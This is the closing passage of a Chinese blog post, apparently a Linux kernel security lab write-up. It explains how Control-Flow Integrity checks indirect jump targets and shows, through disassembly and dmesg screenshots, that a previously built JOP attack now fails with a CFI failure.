+</span></span><span class=line><span class=cl>ffff800008bd95ac:	540000c2 	b.cs	ffff800008bd95c4 &lt;tty_driver_flush_buffer+0x48&gt;  // b.hs, b.nlast
+</span></span></code></pre></td></tr></table></div></div><p>可以看到在开启了CFI之后，出现了<code>regulator_get_current_limit.cfi_jt</code>标签，如果x8和x9寄存器的值不满足要求，就会跳转到该标签对应的函数处，之后调用<code>handle_cfi_failure</code>处理CFI failure；总结来说，CFI通过对函数跳转地址的检查，进而防止JOP攻击</p><ul><li>重新运行JOP攻击程序，查看是否CFI是否能起作用。提交demsg中包含CFI Failure截图</li></ul><p>重新运行JOP攻击程序，发现CFI生效，无法跳转到目标函数</p><p><img src=/p/jop/image-20230606204222585.png width=488 height=188 srcset="/p/jop/image-20230606204222585_hu6a18e47d21c4aa5b7dcd79617fe8e62d_12457_480x0_resize_box_3.png 480w, /p/jop/image-20230606204222585_hu6a18e47d21c4aa5b7dcd79617fe8e62d_12457_1024x0_resize_box_3.png 1024w" loading=lazy alt="image 4" class=gallery-image data-flex-grow=259 data-flex-basis=622px></p><p><img src=/p/jop/image-20230606204234703.png width=475 height=439 srcset="/p/jop/image-20230606204234703_hu4a553b9aa827ccab8b4b73309c20b189_24373_480x0_resize_box_3.png 480w, /p/jop/image-20230606204234703_hu4a553b9aa827ccab8b4b73309c20b189_24373_1024x0_resize_box_3.png 1024w" loading=lazy alt="image 5" class=gallery-image data-flex-grow=108 data-flex-basis=259px></p><p>之后调用<code>dmesg</code>，发现触发了<code>cfi_failure</code></p><p><img src=/p/jop/image-20230606210712108.png width=470 height=135 srcset="/p/jop/image-20230606210712108_hu0b27f953a46820fd805c8b30a6a6a55b_8890_480x0_resize_box_3.png 480w, /p/jop/image-20230606210712108_hu0b27f953a46820fd805c8b30a6a6a55b_8890_1024x0_resize_box_3.png 1024w" loading=lazy alt="image 6" class=gallery-image data-flex-grow=348 data-flex-basis=835px></p><blockquote><p>Written by Jiacheng Hu, at Zhejiang University, Hangzhou, China.</p></blockquote></section><footer class=article-footer><section class=article-tags><a href=/tags/security/>Security</a>
+<a href=/tags/technology/>Technology</a>
+<a href=/tags/linux/>Linux</a></section><section class=article-copyright><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg><span>Licensed under CC BY-NC-SA 4.0</span></section></footer></article><aside class=related-content--wrapper><h2 class=section-title>Related content</h2><div class=related-content><div class="flex article-list--tile"><article class=has-image><a href=/p/rop/><div class=article-image><img src=/p/rop/cover.20bec5e323b5728a9d1698d32f72ae16_hu5b167a362bf183fa776f2ef90b695ed1_16596_250x150_fill_q75_box_smart1.jpg width=250 height=150 loading=lazy alt="Featured image of post ROP | Linux内核攻防" data-key=ROP data-hash="md5-IL7F4yO1coqdFpjTL3KuFg=="></div><div class=article-details><h2 class=article-title>ROP | Linux内核攻防</h2></div></a></article><article class=has-image><a href=/p/cpp-understand-initializer-list/><div class=article-image><img src=/p/cpp-understand-initializer-list/cover.bf953ed90bccb82e12fee7184a53dc67_hu6170f1f82b3711c204643e7d26f97db9_36645_250x150_fill_box_smart1_3.png width=250 height=150 loading=lazy alt="Featured image of post 理解初始化列表" data-key=cpp-understand-initializer-list data-hash="md5-v5U+2QvMuC4S/ucYSlPcZw=="></div><div class=article-details><h2 class=article-title>理解初始化列表</h2></div></a></article><article class=has-image><a href=/p/rust-cs110l-notes-3/><div class=article-image><img src=/p/rust-cs110l-notes-3/cover.1e68e45352544118b3811ec10fd897d5_hu5f8d5b24f629f61bf6061899af2962f9_20586_250x150_fill_box_smart1_3.png width=250 height=150 loading=lazy alt="Featured image of post Stanford CS110L Notes 3" data-key=rust-cs110l-notes-3 data-hash="md5-HmjkU1JUQRizgR7BD9iX1Q=="></div><div class=article-details><h2 class=article-title>Stanford CS110L Notes 3</h2></div></a></article><article class=has-image><a href=/p/rust-cs110l-notes-2/><div class=article-image><img src=/p/rust-cs110l-notes-2/cover.1e68e45352544118b3811ec10fd897d5_hu5f8d5b24f629f61bf6061899af2962f9_20586_250x150_fill_box_smart1_3.png width=250 height=150 loading=lazy alt="Featured image of post Stanford CS110L Notes 2" data-key=rust-cs110l-notes-2 data-hash="md5-HmjkU1JUQRizgR7BD9iX1Q=="></div><div class=article-details><h2 class=article-title>Stanford CS110L Notes 2</h2></div></a></article><article class=has-image><a href=/p/rust-cs110l-notes-1/><div class=article-image><img src=/p/rust-cs110l-notes-1/cover.1e68e45352544118b3811ec10fd897d5_hu5f8d5b24f629f61bf6061899af2962f9_20586_250x150_fill_box_smart1_3.png width=250 height=150 loading=lazy alt="Featured image of post Stanford CS110L Notes 1" data-key=rust-cs110l-notes-1 data-hash="md5-HmjkU1JUQRizgR7BD9iX1Q=="></div><div class=article-details><h2 class=article-title>Stanford CS110L Notes 1</h2></div></a></article></div></div></aside><div class=disqus-container><div id=disqus_thread></div><script type=application/javascript>window.disqus_config=function(){},function(){if(["localhost","127.0.0.1"].indexOf(window.location.hostname)!=-1){document.getElementById("disqus_thread").innerHTML="Disqus comments not available by default when the website is previewed locally.";return}var t=document,e=t.createElement("script");e.async=!0,e.src="//hugo-theme-stack.disqus.com/embed.js",e.setAttribute("data-timestamp",+new Date),(t.head||t.body).appendChild(e)}()</script><noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript><a href=https://disqus.com class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a></div><style>.disqus-container{background-color:var(--card-background);border-radius:var(--card-border-radius);box-shadow:var(--shadow-l1);padding:var(--card-padding)}</style><script>window.addEventListener("onColorSchemeChange",e=>{typeof DISQUS=="object"&&DISQUS.reset({reload:!0})})</script><footer class=site-footer><section class=copyright>&copy;
+2020 -
+2023 Jiacheng Hu</section><section class=powerby>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.20.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a></section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+<button class="pswp__button pswp__button--share" title=Share></button>
+<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)"></button>
+<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css crossorigin=anonymous></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.js defer></script>
+<script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script></body></html>
